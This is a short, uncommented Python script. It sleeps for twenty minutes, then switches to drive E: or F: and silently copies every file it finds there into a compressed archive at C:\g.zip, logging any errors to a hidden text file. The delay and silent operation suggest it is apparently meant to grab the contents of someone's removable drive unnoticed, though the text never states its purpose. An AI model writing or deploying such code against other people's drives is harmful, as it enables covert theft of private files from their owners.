import os
import zipfile
import time

time.sleep(20*60)

try:
    try:
        os.chdir("E:\\")
    except:
        os.chdir("F:\\")

except Exception as e:
    with open("a.txt", "a") as log:
        log.write(str(e))

else:
    with zipfile.ZipFile("C:\\g.zip", "a") as storage:
        for dir_c, dir_s, files in os.walk(os.getcwd()):
            for file in files:
                storage.write(dir_c + "\\" + file,
                              compress_type=zipfile.ZIP_DEFLATED)
